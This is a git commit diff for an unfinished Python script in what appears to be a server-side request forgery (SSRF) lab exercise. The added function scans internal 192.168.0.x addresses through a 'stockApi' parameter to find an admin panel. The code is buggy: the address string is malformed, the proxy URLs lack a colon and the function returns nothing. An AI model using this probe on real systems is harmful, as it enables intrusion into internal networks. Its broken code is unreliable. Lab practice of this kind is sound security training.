12ccd78956a0e0a948e21e31b36303ea60cbdfe8
Jozenartes <jozenarts12@gmail.com>
2025-05-26 14:31:15 +0100

    check_admin_hostname function

--- 04-SSRF/lab-02/ssrf-lab-02.py
+++ 04-SSRF/lab-02/ssrf-lab-02.py
@@ -5,10 +5,25 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'https': 'http//127.0.0.1:8080', 'http': 'http//127.0.0.1:8080'}
 
+def check_admin_hostname(url):
+    check_stock_path = "/product/stock"
+    admin_hostname = ''
+    for i in range(1,256):
+        hostname = 'http://192/168.0.%s:8080/admin' %i
+        params = {'stockApi': hostname}
+        r = requests.post(url + check_stock_path, data = params, verify=False, proxies=proxies)
+        if r.status_code == 200:
+            admin_ip_address = '192.168.0.%s' %i
+            break
+
 def main():
     if len(sys.argv) != 2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
 
+    url = sys.argv[1]
+    print("(+) Finding admin hostname...")
+    admin_hostname = check_admin_hostname(url)
+    # not complete
 if __name__ == "__main__":
     main()
